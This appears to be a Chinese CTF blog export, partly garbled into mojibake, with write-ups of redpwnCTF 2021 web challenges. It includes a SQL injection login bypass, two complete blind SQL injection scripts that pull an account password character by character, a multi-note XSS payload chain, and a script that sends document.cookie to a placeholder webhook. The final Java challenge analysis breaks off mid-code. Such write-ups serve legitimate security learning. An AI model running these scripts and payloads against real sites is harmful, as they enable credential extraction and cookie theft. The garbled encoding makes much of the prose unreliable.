è€ƒè™‘åˆ°è¿™ä¸ªé¢˜æ›´ç»¼åˆäº†pythonçš„ç›¸å…³ç‰¹æ€§ï¼Œæ‰€ä»¥æŠŠè¿™ä¸ªé¢˜æ”¾åœ¨æœ€åã€‚\n ä»æ–°å»ºæ–‡ä»¶åˆ°å†™å®Œç”¨äº†å‡ å¤©æ—¶é—´ï¼Œç»†ç»†åœ°æ•´ç†ç›¸å…³çŸ¥è¯†ï¼Œä¹Ÿç®—æ˜¯å¯¹ååºåˆ—åŒ–è¿™ä¸ªçŸ¥è¯†ç‚¹çš„è®¤è¯†æ¸…æ™°äº†ä¸å°‘ã€‚è¿˜æœ‰ä¸€ä¸ªPyYAMLçš„ååºåˆ—åŒ–é—®é¢˜ï¼Œç”±äºç¯‡å¹…é—®é¢˜æ‹†å¼€æ¥æ”¾åˆ°ä¸‹ä¸€ç¯‡ä¸­ã€‚è‡ªè®¤ä¸ºæ€»ç»“çš„è¿˜æ˜¯æ¯”è¾ƒè¯¦ç»†çš„ï¼ˆå˜¿å˜¿xï¼‰ä¸è¿‡è‚¯å®šè¿˜æœ‰ä¸å‘¨åˆ°çš„åœ°æ–¹ï¼Œä¹‹åå¦‚é‡åˆ°æ›´å¤šçŸ¥è¯†è¿˜ä¼šè¿›è¡Œè¡¥å……ã€‚\nè‡ªå·±è¿˜æ˜¯æœ‰æƒ°æ€§å•Šï¼Œå…¶å®ååºåˆ—åŒ–ç¬¬ä¸€ç¯‡æ€»ç»“çš„æ˜¯phpï¼Œå¯æ˜¯åˆ°ç°åœ¨è¿˜æœ‰å‡ ä¸ªäºŒçº§æ ‡é¢˜ä¸‹é¢æ˜¯ç©ºç™½çš„â€¦â€¦åªèƒ½å…ˆç»™è‡ªå·±æ‰¾ä¸ªå€Ÿå£ï¼šphpååºåˆ—åŒ–çš„ä¸œè¥¿å®åœ¨æ˜¯å¤ªå¤šäº†TAT\n æœ€åæ”¾ä¸€ä¸‹å…¨ç¯‡ç”¨åˆ°çš„çš„å‚è€ƒæ–‡ç« ï¼ˆéƒ¨åˆ†å·²å†™åœ¨å¯¹åº”æ ‡é¢˜ä¸‹é¢ï¼‰ï¼Œä¸åˆ†å…ˆå~\nPython ååºåˆ—åŒ–æ¼æ´å­¦ä¹ ç¬”è®° | ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ Python ååºåˆ—åŒ–æ¼æ´ | pickleååºåˆ—åŒ–åˆæ¢ | Python pickle ååºåˆ—åŒ–å®ä¾‹åˆ†æ | Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆä¸€ï¼‰ - Python ååºåˆ—åŒ–å®‰å…¨é—®é¢˜ï¼ˆäºŒï¼‰ | ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ \u0026amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿ | å…³äºPython secçš„ä¸€äº›ç®€å•çš„æ€»ç»“ | Sour Pickles A serialised exploitation guide in one part - Macro Slaviero | ğŸ Security Issues in Python Pickle\n","date":"2021-08-12T11:48:05+08:00","permalink":"https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/","section":"posts","tags":["python","unserialize"],"title":"ååºåˆ—åŒ–ä¸“é¢˜ç¬”è®°Â·å£¹Â·pythonç¯‡"},{"categories":["CTF"],"contents":"å®˜æ–¹çš„dockeråœ°å€~~å¤ç°ä¸€æœ¬æ»¡è¶³~https://github.com/redpwn/redpwnctf-2021-challenges\nweb/inspect-me  See if you can find the flag in the source code!\ninspect-me.mc.ax\n web/orm-bad  I just learned about orms today! They seem kinda difficult to implement though\u0026hellip; Guess I\u0026rsquo;ll stick to good old raw sql statements!\norm-bad.mc.ax\nDownloads - app.js\n ä¸‡èƒ½å¯†ç ï¼šadmin\u0026rsquo;or'1 : admin\nå…³äºorm ä¹‹åè¦è¡¥ä¸€ä¸‹çŸ¥è¯†ï¼šObjectâ€“relational mapping ORM å®ä¾‹æ•™ç¨‹\nweb/secure  Just learned about encryptionâ€”now, my website is unhackable!\nsecure.mc.ax\nDownloads - index.js\n è¿˜æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå°è¯•ä¸‡èƒ½å¯†ç \næºç æ˜¯è¿™æ ·çš„\nconst crypto = require(\u0026#39;crypto\u0026#39;); const express = require(\u0026#39;express\u0026#39;); const db = require(\u0026#39;better-sqlite3\u0026#39;)(\u0026#39;db.sqlite3\u0026#39;); db.exec(`DROP TABLE IF EXISTS users;`); db.exec(`CREATE TABLE users( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT );`); db.exec(`INSERT INTO users (username, password) VALUES ( \u0026#39;${btoa(\u0026#39;admin\u0026#39;)}\u0026#39;, \u0026#39;${btoa(crypto.randomUUID)}\u0026#39; )`); const app = express(); app.use( require(\u0026#39;body-parser\u0026#39;).urlencoded({ extended: false, }) ); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { if (!req.body.username || !req.body.password) return res.redirect(\u0026#39;/?message=Username and password required!\u0026#39;); const query = `SELECT id FROM users WHERE username = \u0026#39;${req.body.username}\u0026#39; AND password = \u0026#39;${req.body.password}\u0026#39;;`; try { const id = db.prepare(query).get()?.id; if (id) return res.redirect(`/?message=${process.env.FLAG}`); else throw new Error(\u0026#39;Incorrect login\u0026#39;); } catch { return res.redirect( `/?message=Incorrect username or password. Query: ${query}` ); } }); ä»–è¿™ä¸ªb64åŠ å¯†æ˜¯å‘ç”Ÿåœ¨å‰ç«¯çš„ï¼Œä¹Ÿå°±æ˜¯åœ¨å‘åŒ…çš„æ—¶å€™å°±å·²ç»å¯¹postçš„æ•°æ®è¿›è¡Œäº†é¢„å¤„ç†ï¼Œè€Œå…·ä½“åˆ°åç«¯è¿›è¡Œsqlè¯­å¥çš„æŸ¥è¯¢æ—¶ä¼šç›´æ¥æ‹¼æ¥req.body.username/passwdçš„æ•°æ®ï¼Œä¸ä¼šè¿›è¡Œè¿›ä¸€æ­¥çš„æ£€æŸ¥æˆ–è¿‡æ»¤\nåˆšå¼€å§‹æƒ³å¤æ‚äº†\nweb/cool  Aaron has a message for the cool kids. For support, DM BrownieInMotion.\ncool.mc.ax\nDownloads - app.py\n ç™»å½•æ¡†ï¼Œå¯ä»¥æ³¨å†Œ å…ˆå°è¯•test: test ç™»å½•æˆåŠŸä½†æ˜¯æ— æ³•è·å–ä¿¡æ¯ï¼ˆæ³¨å†Œåä¹Ÿä¼šè·³è½¬è¿™ä¸ªé¡µé¢\nç•™æ„cookieéƒ¨åˆ†ï¼Œæ˜¯ç†Ÿæ‚‰çš„flask sessionï¼Œæ‰”è¿›å·¥å…·é‡Œè§£å¯†\nå†å‚è€ƒæºç ä¸­çš„/messageéƒ¨åˆ†ï¼Œè€ƒè™‘å°†sessionè®¾ä¸º{\u0026ldquo;username\u0026rdquo;:\u0026ldquo;ginkoid\u0026rdquo;}åç™»å…¥æŸ¥çœ‹ä¿¡æ¯ï¼ˆå¼€å§‹ä»¥ä¸ºæ˜¯sessionä¼ªé€  åæ¥å‘ç°ä¸æ˜¯ï¼‰\nçœ‹ä¸€ä¸‹å…¶ä»–éƒ¨åˆ†çš„æºç ï¼Œé¦–å…ˆæ˜¯init()\ndef init(): # this is terrible but who cares execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) execute(\u0026#39;DROP TABLE users;\u0026#39;) execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) # put ginkoid into db ginkoid_password = generate_token() execute( \u0026#39;INSERT OR IGNORE INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;ginkoid\\\u0026#39;, \\\u0026#39;{ginkoid_password}\\\u0026#39;);\u0026#39; ) execute( f\u0026#39;UPDATE users SET password=\\\u0026#39;{ginkoid_password}\\\u0026#39;\u0026#39; f\u0026#39;WHERE username=\\\u0026#39;ginkoid\\\u0026#39;;\u0026#39; ) ç„¶åæ˜¯åœ¨åˆ›å»ºç”¨æˆ·create_user()å’Œç™»å½•check_login()æ—¶éƒ½ä¼šæ£€æµ‹ç”¨æˆ·åä¸­æ˜¯å¦æœ‰éæ³•å­—ç¬¦ï¼ˆç™½åå•æ˜¯26ä¸ªè‹±æ–‡å­—æ¯å¤§å°å†™å’Œæ•°å­—ï¼‰ï¼Œç®—æ˜¯æŒºä¸¥æ ¼çš„\ndef create_user(username, password): if any(c not in allowed_characters for c in username): return (False, \u0026#39;Alphanumeric usernames only, please.\u0026#39;) if len(username) \u0026lt; 1: return (False, \u0026#39;Username is too short.\u0026#39;) if len(password) \u0026gt; 50: return (False, \u0026#39;Password is too long.\u0026#39;) other_users = execute( f\u0026#39;SELECT * FROM users WHERE username=\\\u0026#39;{username}\\\u0026#39;;\u0026#39; ) if len(other_users) \u0026gt; 0: return (False, \u0026#39;Username taken.\u0026#39;) execute( \u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39; # passwdéƒ¨åˆ†å¯æ§ ) return (True, \u0026#39;\u0026#39;) è€ƒè™‘äº†ä¸€ä¸‹äºŒæ¬¡æ³¨å…¥ï¼Œå› ä¸ºæ³¨å†Œæ—¶çš„passwdéƒ¨åˆ†å®Œå…¨å¯æ§ï¼Œè®¾æƒ³æ˜¯è¿™æ ·çš„\næ„é€ passwdéƒ¨åˆ†ä¸º '),('ginkoid','passwd\nemmmm ä½†æ˜¯è¿™é‡Œä¸ç®¡æ˜¯æ˜æ–‡è¿˜æ˜¯url encodeéƒ½ä¼šæœ‰500é”™è¯¯ï¼Œè€Œä¸”è¿™é‡Œè¿”å›çš„æ—¶correct_password[0][0]==passwordï¼Œä¹Ÿç®—æ˜¯æœç»äº†è¿™ç§å¤šæ·»åŠ ä¸€æ¡ä¿¡æ¯çš„å¯èƒ½ï¼Œä¹‹å‰å·²ç»åˆå§‹åŒ–çš„å¯†ç ä¼šæ˜¯[0][0]ï¼Œè€Œæ–°æ’å…¥çš„passwdå°†æ˜¯[1][0]ï¼›å¹¶ä¸”åœ¨init()æ—¶å®šä¹‰usernameæ˜¯primary ä¹Ÿä¸å¯èƒ½æœ‰é‡å¤çš„\nâ€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™å°±åœåˆ°è¿™é‡Œäº†ï¼Œä¹Ÿæ˜¯å½“æ—¶äº†è§£çš„å¤ªå°‘ï¼Œæ€è·¯å¾ˆå®¹æ˜“å°±æ–­æ‰äº†ã€‚ã€‚ã€‚ä»¥ä¸‹æ˜¯å¤ç°\nåœ¨çœ‹äº†è¿™ç¯‡wpä¹‹åï¼Œå‘ç°è¿™ä½å¸ˆå‚…æœ€å¼€å§‹è·Ÿæˆ‘çš„æ€è·¯æ˜¯ä¸€æ ·çš„ éƒ½æƒ³åˆ©ç”¨inserté‚£ä¸€å¥ï¼Œéƒ½æƒ³æ›¿æ¢æ‰æ•°æ®åº“ä¸­åŸæ¥å­˜æœ‰çš„ginkoidçš„å¯†ç ï¼›è¿™ä½å¸ˆå‚…ç”¨çš„payloadæ˜¯\n'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';-- å…¶ä¸­çš„ON CONFLICT DO UPDATE SETï¼Œåœ¨è¿™ç¯‡å®˜æ–¹æ–‡æ¡£é‡Œå†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™ä½å¸ˆå‚…ç»™çš„payloadå¾ˆå¥½ï¼ˆæˆ‘å½“æ—¶åˆ™å¯¹è¿™ä¸ªsqlè¯­å¥å¹¶ä¸æ¸…æ¥šï¼‰ä½†æ˜¯æ­£å¦‚ä»–æ‰€è¯´çš„ï¼Œwhich is 8 characters over the limit, which won\u0026rsquo;t do.\næœ€åä½¿ç”¨ç›²æ³¨çš„æ–¹å¼ï¼Œå…ˆä¸Šä¸€ä¸‹è„šæœ¬ ï¼ˆè¿™é‡Œæ˜¯æ¥æºï¼‰å†è¯´è¯´æ€è·¯\nimport time import requests url = \u0026#34;https://cool.mc.ax/\u0026#34; # url = \u0026#34;http://127.0.0.1:5000/\u0026#34; prefix = \u0026#34;asdfjwfoijweoijfojiewfj\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#34; val = \u0026#34;\u0026#34; for i in range(32): username = prefix + str(time.time_ns()).replace(\u0026#34;0\u0026#34;, \u0026#34;\u0026#34;)\t# æ³¨æ„ç™½åå•é‡Œæ²¡æœ‰0 è¦æ¢æ‰ password = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; resp = requests.post(url + \u0026#34;register\u0026#34;, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password}).text for c in charset: resp = requests.post(url, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: c}).text if \u0026#34;Incorrect\u0026#34; not in resp: print(c) val += c break print(val) æ³¨å…¥ç‚¹ä»ç„¶æ˜¯ä¸Šæ–‡æåˆ°çš„/registerè·¯ç”±ä¸­create_user(username,password)ï¼ˆå½“æ—¶æ‰¾å¯¹äº†æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯ç›²æ³¨è¿™å—è¿˜æ˜¯åšçš„å°‘ï¼‰\nä¸»è¦çš„payloadæ˜¯\npassword = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; è¿™ä¸€å¥ï¼Œå½“è¿›å…¥åˆ°æ³¨å†Œæµç¨‹æ—¶ ä¼šæ‰§è¡Œ\nexcute(\u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39;) å³\nexcute(\u0026#39;INSERT INTO users(username, password)\u0026#39; values (\u0026#39;xxxxusernamexxxx\u0026#39;, \u0026#39;\u0026#39;||(select substr(password,n,1) from users)||\u0026#39;\u0026#39;)) å…¶ä¸­||è¿æ¥ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦ä¸²ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼›æ‰€ä»¥å‘é€æ³¨å†Œè¯·æ±‚æ—¶passwordçš„å€¼å°±æ˜¯åé¢çš„æŸ¥è¯¢è¯­å¥select substr(password,n,1) from usersï¼Œè€ŒæŸ¥è¯¢è¯­å¥è¿”å›çš„æ˜¯substr(password,n,1) æ˜¯ginkoidè¿™ä¸ªè´¦æˆ·çš„å¯†ç çš„å…¶ä¸­ä¸€ä½ï¼Œè¦è·å¾—è¿™ä¸ªå€¼å…·ä½“æ˜¯ä»€ä¹ˆ éœ€è¦å†æœ‰ä¸€ä¸ªfor in _ in charsetéå†ï¼Œåœ¨ç™»å½•å¤„ æŠŠè¿™ä¸ªå€¼ç»™è¯•å‡ºæ¥\nè‹±æ–‡ç‰ˆè®²è§£ï¼šThe SELECT statement will take the character at index in ginkoid\u0026rsquo;s password, and concatenate it with \u0026lsquo;\u0026rsquo;, to be used as the new user\u0026rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.\nè·å¾—å¯†ç åä»¥ginkoidçš„è´¦å·ç™»å½•ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªmp3æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ä»€ä¹ˆæ‰€è°“çš„éšå†™ flagå°±åœ¨æŠ“åŒ…åå¯ä»¥çœ‹åˆ°\nâ€”â€”â€”â€”å…¶å®è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹ç–‘é—®ï¼Œä¸ºä»€ä¹ˆselect substr(password,n,1) from userså°±èƒ½ç¡®ä¿æ˜¯ginoidçš„passwdå‘¢ï¼Ÿginkoidæ˜¯è¡¨ä¸­çš„ç¬¬ä¸€æ¡æ•°æ®ï¼Œåœ¨æ–°å»ºè¡¨åç«‹åˆ»æ’å…¥ï¼Œè¿™å°±å¯ä»¥ä¿è¯åœ¨æŸ¥è¯¢çš„æ—¶å€™åªæŸ¥ginkoidçš„å¯†ç å—ï¼Ÿ\ndiscordä¹‹å‰æœ‰äººé—®è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå½“æ—¶çš„è§£ç­”æ˜¯è¿™æ˜¯sqlliteçš„ç‰¹æ€§ï¼Œä½†æ˜¯ç”¨sqlliteåœ¨çº¿å·¥å…·å°è¯•åå‘ç°ä¹Ÿä¸æ˜¯è¿™æ ·çš„ ä¹Ÿä¼šè¿”å›æ‰€æœ‰æ•°æ®çš„substr(x,x,x)çš„å€¼ï¼Œä½†æ˜¯ç¡®å®æ˜¯ç”¨è¿™æ ·çš„payloadèƒ½åšå‡ºæ¥\nâ€”â€”â€”â€”åæ¥æƒ³äº†ä¸€ä¸‹ æ˜¯è¿™é‡Œçš„return correct_password[0][0]==password ç¡®ä¿äº†è™½ç„¶sqlæŸ¥è¯¢è¯­å¥è¿”å›çš„æ˜¯å¾ˆå¤šä¸ªå•ä¸€å­—æ¯ï¼Œä½†æ˜¯æ˜¯å¤šè¡Œè¿”å›ï¼Œä»ç„¶åªä¼šå–åˆ°ç¬¬ä¸€ä¸ªï¼›å†åŠ ä¸Šusernameæ˜¯ä¸»é”® ç¬¬ä¸€ä¸ªæ’å…¥ï¼Œæ‰€ä»¥è¿™ä¸ªpayloadæ˜¯å¯ä»¥çš„ä»¥ä¸€ä¸ªäº‹åè¯¸è‘›äº®çš„è§’åº¦æ¥çœ‹return correct_password[0][0]==password è¿™å¥ä»£ç  å…¶å®æœ‰æš—ç¤ºçš„æˆåˆ†åœ¨äº†\nâ€”â€”â€”â€”è¿˜æœ‰å¦ä¸€ç‰ˆçš„è„šæœ¬ discordé‡Œæ”¶çš„import asyncio import random import aiohttp allowed = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#39; url = \u0026#39;\u0026lt;https://cool.mc.ax/\u0026gt;\u0026#39; n = 32 final = dict() async def try_pass(sem, username, password, index): params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: password, } async with sem: async with aiohttp.ClientSession() as session: async with session.post(url, data=params) as resp: result = await resp.text() if \u0026#39;Incorrect\u0026#39; not in result: print(f\u0026#39;password[{index}]: {password}\u0026#39;) final[index] = password async def get_char(sem, index): # random username since otherwise we error username = \u0026#39;\u0026#39;.join(random.choices(allowed, k=32)) payload = f\u0026#34;\u0026#39;||(SELECT substr(password,{index+1},1) FROM users)||\u0026#39;\u0026#34; assert(len(payload) \u0026lt;= 50) params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: payload, } async with sem: async with aiohttp.ClientSession() as session: await session.post(url + \u0026#39;register\u0026#39;, data=params) tasks = [] for c in allowed: tasks.append(try_pass(sem, username, c, index)) await asyncio.gather(*tasks) async def main(): # without this we get an OSError due to too many open file descriptors sem = asyncio.Semaphore(300) index_tasks = [] for i in range(n): index_tasks.append(get_char(sem, i)) await asyncio.gather(*index_tasks) password = \u0026#39;\u0026#39; for i in range(len(final)): password += final[i] print(f\u0026#34;Password: {password}\u0026#34;) asyncio.run(main()) web/notes  Texting things to yourself, but online! notes.mc.ax\nPlease put a reasonably secure password when making an account\nReport problems here.\nDownloads - notes.tar.gz\n å…ˆçœ‹é¡µé¢ æ˜¯ä¸ªç™»å½•æ¡†ï¼Œå…ˆå¡«ç”¨æˆ·åå’Œå¯†ç å†ç‚¹loginæˆ–registerï¼Œå°è¯•test: testç™»å…¥ï¼Œç•Œé¢æ˜¯ä¸€ä¸ªå¯ä»¥åŠ notes è‡ªå®šbodyå’Œtagçš„appåœ¨view notesçœ‹åˆ°å·²ç»æœ‰äººè¯•è¿‡xssäº†ï¼Œè¿™é‡Œæœ‰ä¸ªå°å°çš„è¶Šæƒæ¼æ´ï¼Œ/view/+usernameç›´æ¥å¯ä»¥çœ‹åˆ°å…¶ä»–çš„å¸ˆå‚…åœ¨å°è¯•ä»€ä¹ˆæ ·çš„payloadï¼ˆçœ‹äº†wpä»¥åæ‰æ„è¯†åˆ°è¿™é‡Œçš„tagéƒ¨åˆ†å°±æ˜¯æ³¨å…¥ç‚¹ è€Œå½“æ—¶çš„æˆ‘ä»¥ä¸ºæ˜¯å¡bugäº†ç®€å•å®¡äº†ä¸‹æºç ï¼Œä¹Ÿæ²¡å•¥ç‰¹åˆ«çš„ï¼Œé¦–å…ˆåˆå§‹åŒ–ä¸€ä¸ªadminå·ï¼Œflagåœ¨adminçš„privateåˆ†ç±»çš„notesä¸­ï¼›å¯¹äºä¸ªäººå‘çš„notesä¼šè½¬ä¹‰bodyéƒ¨åˆ†ä¸ºhtmlå®ä½“æ¥é¢„é˜²xss\nä½†æ˜¯è¿™ä¸ªnotes-appçš„å½¢å¼æ˜¯å¦¥å¦¥çš„xssäº†ï¼Œé‚£çªç ´å£åœ¨å“ªé‡Œæï¼Ÿå…¶å®æ˜¯è¢«å¿½ç•¥çš„tagéƒ¨åˆ†ï¼ä¸€èˆ¬æƒ…å†µä¸‹çœ‹åˆ°tagå¯é€‰private/publicå°±ä¼šä¸å…³æ³¨è¿™é‡Œï¼Œä½†æ˜¯é…åˆç‰¹æ®Šçš„DOMè§£æ è¿™é‡Œæ— ç–‘æ˜¯æ³¨å…¥ç‚¹ï¼ä¸‹é¢ç®€å•åˆ†æä¸€ä¸‹ï¼Œå‚è€ƒwp\nä»/static/view.htmlä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªnotes-appçš„å‰ç«¯æ¸²æŸ“æ‰€å‡­å€Ÿçš„æ¨¡æ¿é•¿å•¥æ ·\nbodyéƒ¨åˆ†è¢«å®Œå…¨çš„ä¿æŠ¤äº†ï¼Œä½†æ˜¯tagæ²¡æœ‰è¿‡æ»¤ åªæ˜¯é™åˆ¶äº†ä¸ªæ•°\næˆ‘ä»¬åˆ©ç”¨çš„å°±æ˜¯æµè§ˆå™¨è§£æhtmlçš„éƒ¨åˆ†ï¼Œå¯ä»¥è®©ä¸ç›¸å…³çš„å‡ ä¸ªnotesæ‹¼æ¥åœ¨ä¸€èµ·ï¼ˆä¸¾ä¸ªç®€å•çš„æ —å­ï¼šåœ¨ä¸€ä¸ªnoteé‡Œé¢ç”¨\u0026lt;p\u0026gt; å¦ä¸€ä¸ªé‡Œé¢æ”¾\u0026lt;/p\u0026gt;ï¼Œä¸­é—´çš„éƒ¨åˆ†ä¼šè¢«æ”¾åœ¨ä¸€èµ·ï¼‰è¿™é‡Œé€‰ç”¨çš„æ˜¯\u0026lt;style\u0026gt;è¿™ä¸ªtagï¼Œåˆ©ç”¨å®ƒonloadçš„å±æ€§\nè¿˜æœ‰ä¸€ä¸ªå¾…è§£å†³çš„é—®é¢˜æ˜¯ä¸Šä¸‹ä¸¤ä¸ªnotesä¹‹é—´ä¼šæœ‰\u0026lt;div class=\u0026quot;card\u0026quot;\u0026gt;çš„å­˜åœ¨ï¼›è¿™ä¹Ÿæ˜¯ä¸ç”¨\u0026lt;iframe\u0026gt;å’Œå®ƒçš„onloadå±æ€§çš„åŸå› ï¼Œå› ä¸ºæµè§ˆå™¨æ˜¯ä¸å…è®¸\u0026lt;iframe\u0026gt;ä¸­å±æ€§æ¢è¡Œçš„\næˆ‘ä»¬æœ€ç»ˆçš„payload\nbody: anything tag: \u0026lt;style a=' body: anything tag: 'onload='` body: `;eval(somecode)/* tag: */'\u0026gt; ç„¶åæ˜¯å¸¸è§„çš„xss\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.open(\u0026#34;https://notes.mc.ax/view/\u0026lt;username\u0026gt;\u0026#34;, \u0026#34;navigator.sendBeacon(\u0026#39;\u0026lt;webhook server\u0026gt;\u0026#39;, document.cookie)\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; web/Requester  Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021\nrequester.mc.ax\nDownloads - requester-release.zip\n javaå¯ä»¥è¯´æ˜¯å®Œå…¨ä¸æ‡‚ï¼Œæ¯”èµ›çš„æ—¶å€™å°±ç®€å•çœ‹äº†ä¸‹å°±æºœäº†ï¼Œå‚è€ƒ è§£æ³•1 - _replicator è§£æ³•2 - _find\nä¸€ä¸ªç®€å•çš„java-appï¼Œæ£€æµ‹ç»™å‡ºçš„apiæ˜¯å¦æ­£å¸¸ å¹¶ä¸”è¿”å›ä¸€ä¸ªjson\nç»™äº†docker\nå…ˆç”¨jd-guiæ‰“å¼€jaråŒ…çœ‹çœ‹æºç \nå…ˆçœ‹Main.class\npublic class Main { public static Database db; public static String flag; public static void main(String[] args) { String adminUser = System.getenv(\u0026#34;adminUser\u0026#34;); String adminPassword = System.getenv(\u0026#34;adminPassword\u0026#34;); flag = System.getenv(\u0026#34;flag\u0026#34;); String javalinEnv = System.getenv(\u0026#34;javalinEnv\u0026#34;); db = new Database(adminUser, adminPassword); db.initializeDatabase(); JavalinJte.configure(createTemplateEngine(javalinEnv)); Javalin app = Javalin.create().start(8080); app.get(\u0026#34;/\u0026#34;, ctx -\u0026gt; ctx.render(\u0026#34;index.jte\u0026#34;)); app.get(\u0026#34;/createUser\u0026#34;, Handlers::createUser); app.get(\u0026#34;/testAPI\u0026#34;, Handlers::testAPI); } } åšä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œï¼Œå–å‡ºadminçš„ç”¨æˆ·åå’Œå¯†ç ä»¥åŠflagçš„å€¼ï¼Œæ–°å»ºä¸€ä¸ªdatabaseï¼Œåˆ†å‡º3ä¸ªè·¯ç”±ï¼›\nå…ˆçœ‹database.classï¼ˆåˆ†æçš„æ¯”è¾ƒè¯¦ç»† ä¹‹å‰åšjavaå¾ˆå°‘\nprivate final String adminUsername; private final String adminPassword; public Database(String adminUsername, String adminPassword) { this.adminUsername = adminUsername; this.adminPassword = adminPassword; } private String getDbString() { return \u0026#34;http://\u0026#34; + this.adminUsername + \u0026#34;:\u0026#34; + this.adminPassword + \u0026#34;@couchdb:5984/\u0026#34;; } private boolean validateAlphanumeric(String name) { return name.matches(\u0026#34;^[a-zA-Z0-9_]*$\u0026#34;); } å­˜å‚¨ä»main.classé‡Œæ¥æ”¶åˆ°çš„adminUsername\u0026amp;adminPasswordï¼›getDbString()è¿”å›ä¸€ä¸ªå¯ä»¥ç”¨æ¥è¿æ¥couchdbæ•°æ®åº“çš„url\npublic void createDatabase(String name) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); JSONObject res = HttpClient.putAPI(getDbString() + getDbString(), \u0026#34;\u0026#34;); if (!res.has(\u0026#34;ok\u0026#34;) || !res.getBoolean(\u0026#34;ok\u0026#34;)) throw new Exception(\u0026#34;Database creation failed\u0026#34;); } public void initializeDatabase() { try { createDatabase(\u0026#34;_replicator\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Replicator already initialized\u0026#34;); } try { createDatabase(\u0026#34;_users\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Users already initialized\u0026#34;); } try { createDatabase(\u0026#34;log\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Log already initialized\u0026#34;); } } é€šè¿‡å‘æ„é€ å¥½çš„urlå‘é€httpè¯·æ±‚æ¥åˆ›å»ºæ•°æ®åº“ï¼Œæœ‰ä¸‰ä¸ªé»˜è®¤çš„åº“ï¼š_replicator, _users, log\npublic void createUser(String name, String password) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); if (password.length() \u0026gt; 16 || !validateAlphanumeric(password)) throw new Exception(\u0026#34;Illegal password\u0026#34;); // ... boring java stuff  JSONObject res = HttpClient.putAPI(getDbString() + \u0026#34;_users/org.couchdb.user:\u0026#34; + getDbString(), userObj.toString()); // ... boring java stuff  } public void addUserToDatabase(String dbName, String username) throws Exception { if (dbName.length() \u0026gt; 16 || !validateAlphanumeric(dbName)) throw new Exception(\u0026#34;Illegal dbname\u0026#34;); if (username.length() \u0026gt; 16 || !validateAlphanumeric(username)) throw new Exception(\u0026#34;Illegal username\u0026#34;); // ... boring java stuff  JSONObject res = HttpClient.putAPI(getDbString() + getDbString() + \u0026#34;/_security\u0026#34;, configObj.toString()); // ... boring java stuff  } public void insertDocumentToDatabase(String dbName, String document) throws Exception { // ... boring java stuff  JSONObject res = HttpClient.postAPI(getDbString() + getDbString(), document); // ... boring java stuff  } è¿™éƒ¨åˆ†æ˜¯åˆ›å»ºç”¨æˆ·å¹¶æ’å…¥æ•°æ®åº“ä¸­ å¹¶ä¸”æ’å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¬¸ ç”¨çš„ä¹Ÿæ˜¯httpå‘è¯·æ±‚è¿™ä¸€æ‹› è¿™ä¸å°±å¯æ§äº†ï¼Ÿ\nè¿™é‡Œå°±å®Œäº†ï¼Œè½¬å»çœ‹Handlers.class\npublic static void createUser(Context ctx) { String username = (String)ctx.queryParam(\u0026#34;username\u0026#34;, String.class).get(); String password = (String)ctx.queryParam(\u0026#34;password\u0026#34;, String.class).get(); try { Main.db.createDatabase(username); 